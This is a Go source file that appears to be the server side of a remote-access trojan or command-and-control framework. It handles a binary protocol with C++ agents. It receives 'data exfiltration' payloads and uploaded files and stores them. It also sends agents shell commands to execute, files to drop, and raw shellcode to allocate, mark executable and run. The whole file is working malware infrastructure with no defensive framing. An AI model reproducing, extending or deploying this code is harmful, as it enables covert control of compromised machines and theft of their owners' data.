package network

import (
	"backend/models"
	"backend/utils"
	"encoding/binary"
	"fmt"
	"log"
	"time"
)

/*
handleClientConnection manages a single connected client.

This goroutine runs for the lifetime of the TCP connection.

Duties:
- Continuously read incoming binary messages
- Enforce 60-second read timeout (disconnect dead clients)
- Parse incoming messages into InternalMessage structs
- Forward parsed messages to processClientMessage()
- Update LastSeen timestamp
- Remove client and cleanup on disconnect
*/
func handleClientConnection(client *models.Client) {
	defer func() {
		client.Conn.Close()
		RemoveClient(client.IPAddress)
		log.Printf("Client disconnected: %s", client.ID)
	}()

	buffer := make([]byte, 4096)

	for {
		// Prevent dead clients from hanging forever.
		client.Conn.SetReadDeadline(time.Now().Add(60 * time.Second))

		n, err := client.Conn.Read(buffer)
		if err != nil {
			log.Printf("Read error from client %s: %v", client.ID, err)
			return
		}

		if n > 0 {
			// Convert raw bytes → structured binary message
			message, err := parseBinaryMessage(buffer[:n])
			if err != nil {
				log.Printf("Parse error from client %s: %v", client.ID, err)
				continue
			}

			processClientMessage(client, message)
			client.LastSeen = time.Now()
		}
	}
}

/*
parseBinaryMessage reads a raw byte buffer and constructs an InternalMessage.

Message format (Little Endian):
[0–3]   uint32 MessageType
[4–7]   uint32 DataSize
[8–11]  uint32 MessageID
[12..]  Data (optional)

This function:
- Validates minimum header length
- Extracts fields using binary.LittleEndian
- Validates DataSize integrity
- Copies payload bytes

Returns InternalMessage or error.
*/
func parseBinaryMessage(data []byte) (*models.InternalMessage, error) {
	if len(data) < 12 {
		return nil, fmt.Errorf("message too short")
	}

	msg := &models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: binary.LittleEndian.Uint32(data[0:4]),
			DataSize:    binary.LittleEndian.Uint32(data[4:8]),
			MessageID:   binary.LittleEndian.Uint32(data[8:12]),
		},
	}

	// Ensure payload exists and is complete
	if msg.Header.DataSize > 0 {
		if len(data) < 12+int(msg.Header.DataSize) {
			return nil, fmt.Errorf("incomplete message data")
		}
		msg.Data = make([]byte, msg.Header.DataSize)
		copy(msg.Data, data[12:12+msg.Header.DataSize])
	}

	return msg, nil
}

/*
processClientMessage handles ALL incoming messages from C++ clients.

Responsibilities:
- Convert raw binary message → human-readable ClientMessage
- Route message types to correct logic (sysinfo, upload file, error report, etc.)
- Persist messages in Client.Messages (history)
- Execute server-side actions (save files, save exfil data)

This function is the "dispatcher" for all client→server communication.
*/
func processClientMessage(client *models.Client, msg *models.InternalMessage) {
	// Create readable log entry / history entry
	clientMessage := models.ClientMessage{
		Timestamp: time.Now(),
		MessageID: msg.Header.MessageID,
		DataSize:  len(msg.Data),
		Content:   string(msg.Data),
	}

	// Route based on message type (must match C++ enums)
	switch msg.Header.MessageType {
	case models.MESSAGE_HANDSHAKE:
		clientMessage.Type = "HANDSHAKE"
		log.Printf("Handshake from client %s", client.ID)
		sendWelcomeMessage(client)

	case models.MESSAGE_HEARTBEAT:
		clientMessage.Type = "HEARTBEAT"
		log.Printf("Heartbeat from client %s", client.ID)

	case models.MESSAGE_SYS_INFO:
		clientMessage.Type = "SYS_INFO"
		log.Printf("System info from client %s: %d bytes", client.ID, len(msg.Data))

	case models.MESSAGE_COMMAND_RESULT:
		clientMessage.Type = "COMMAND_RESULT"
		log.Printf("Command result from client %s (ID: %d):\n%s",
			client.ID, msg.Header.MessageID, string(msg.Data))

	case models.MESSAGE_DATA_EXFIL:
		clientMessage.Type = "DATA_EXFIL"
		log.Printf("Data exfiltration from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveExfilData(client.ID, msg.Data)

	case models.MESSAGE_UPLOAD_FILE:
		clientMessage.Type = "FILE_UPLOAD"
		log.Printf("File upload from client %s: %d bytes", client.ID, len(msg.Data))
		utils.SaveUploadedFile(client.ID, msg.Data)

	case models.MESSAGE_ERROR_REPORT:
		clientMessage.Type = "ERROR_REPORT"
		log.Printf("Error report from client %s: %s", client.ID, string(msg.Data))
	}

	// Append to client's message history (max 100)
	clientsMutex.Lock()
	client.Messages = append(client.Messages, clientMessage)
	if len(client.Messages) > 100 {
		client.Messages = client.Messages[1:] // Drop oldest
	}
	clientsMutex.Unlock()
}

/*
sendBinaryMessage writes a fully constructed InternalMessage
to the client over TCP.

This is the ONLY function that performs the actual network write.
*/
func sendBinaryMessage(client *models.Client, msg models.InternalMessage) error {
	data := serializeBinaryMessage(msg)
	_, err := client.Conn.Write(data)
	return err
}

/*
serializeBinaryMessage converts an InternalMessage struct
into the binary protocol format expected by the client.

Header = 12 bytes
Data   = variable length
*/
func serializeBinaryMessage(msg models.InternalMessage) []byte {
	data := make([]byte, 12+len(msg.Data))

	binary.LittleEndian.PutUint32(data[0:4], msg.Header.MessageType)
	binary.LittleEndian.PutUint32(data[4:8], msg.Header.DataSize)
	binary.LittleEndian.PutUint32(data[8:12], msg.Header.MessageID)

	if len(msg.Data) > 0 {
		copy(data[12:], msg.Data)
	}

	return data
}

/*
sendWelcomeMessage is automatically sent after a client handshake.

Purpose: confirm protocol connection and message formatting.
*/
func sendWelcomeMessage(client *models.Client) {
	welcome := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_HANDSHAKE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    0,
		},
	}
	sendBinaryMessage(client, welcome)
}

//
// ========================
//     SERVER → CLIENT OPS
// ========================
//

/*
SendCommandToClient sends a MESSAGE_EXECUTE_COMMAND.

This is ONLY for executing shell/console commands.
Not used for system info or specialized requests.

Data = UTF-8 command string.
*/
func SendCommandToClient(clientAddr string, command string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_COMMAND,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(command)),
		},
		Data: []byte(command),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent EXECUTE_COMMAND to client %s: %s", clientAddr, command)
	return nil
}

/*
SendFileToClient sends a binary blob that the client should store as a file.

The C++ agent should interpret MESSAGE_DOWNLOAD_FILE as:
"save this file somewhere."
*/
func SendFileToClient(clientAddr string, fileData []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_DOWNLOAD_FILE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(fileData)),
		},
		Data: fileData,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent DOWNLOAD_FILE to client %s: %d bytes", clientAddr, len(fileData))
	return nil
}

/*
SendShellcodeToClient sends raw shellcode bytes that the client
should allocate, mark executable, and run.

This is the most dangerous and powerful message type.
*/
func SendShellcodeToClient(clientAddr string, shellcode []byte) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_EXECUTE_SHELL_CODE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(shellcode)),
		},
		Data: shellcode,
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent EXECUTE_SHELL_CODE to client %s: %d bytes", clientAddr, len(shellcode))
	return nil
}

/*
UpdateClientConfig sends configuration data to the client agent.

The agent decides what "config" means (poll rate, directory paths, modes, etc.)
*/
func UpdateClientConfig(clientAddr string, config string) error {
	client, exists := GetClient(clientAddr)
	if !exists {
		return fmt.Errorf("client not connected")
	}

	msg := models.InternalMessage{
		Header: models.MessageHeader{
			MessageType: models.MESSAGE_CONFIG_UPDATE,
			MessageID:   utils.GenerateMessageID(),
			DataSize:    uint32(len(config)),
		},
		Data: []byte(config),
	}

	if err := sendBinaryMessage(client, msg); err != nil {
		return err
	}

	log.Printf("Sent CONFIG_UPDATE to client %s", clientAddr)
	return nil
}
